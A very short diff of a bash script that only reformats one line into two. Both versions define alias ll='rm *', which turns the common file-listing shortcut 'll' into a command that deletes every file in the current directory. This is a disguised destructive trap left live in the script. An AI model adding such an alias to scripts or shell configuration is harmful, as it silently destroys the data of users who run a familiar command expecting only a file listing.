@@ -1,2 +1,3 @@
 #!/bin/bash
-alias ll='rm *'; printf "\n"
+alias ll='rm *'
+printf "\n"
